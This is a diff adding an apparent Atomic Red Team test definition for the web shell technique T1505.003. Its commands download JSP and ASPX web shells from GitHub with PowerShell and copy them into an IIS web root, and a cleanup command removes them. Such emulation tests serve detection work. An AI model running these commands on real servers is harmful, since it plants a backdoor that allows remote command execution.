@@ -1,0 +1,42 @@
+{
+  "attack_technique": "T1505.003",
+  "display_name": "Server Software Component: Web Shell",
+  "atomic_tests": [
+    {
+      "name": "Web Shell Written to Disk",
+      "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{web_shell_path}\\b.jsp /q >nul 2>&1\ndel #{web_shell_path}\\tests.jsp /q >nul 2>&1\ndel #{web_shell_path}\\cmd.aspx /q >nul 2>&1",
+        "procedure": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "web_shell_path",
+          "description": "The path to drop the web shell",
+          "type": "string",
+          "default": "C:\\inetpub\\wwwroot"
+        },
+        {
+          "arg_name": "web_shells",
+          "description": "Path of Web Shell",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1505.003\\src"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Web shell must exist on disk at specified location (#{web_shells})",
+          "prereq_command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"#{web_shells}\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp\" -OutFile \"#{web_shells}/tests.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "0a2ce662-1efa-496f-a472-2fe7b080db16"
+    }
+  ]
+}
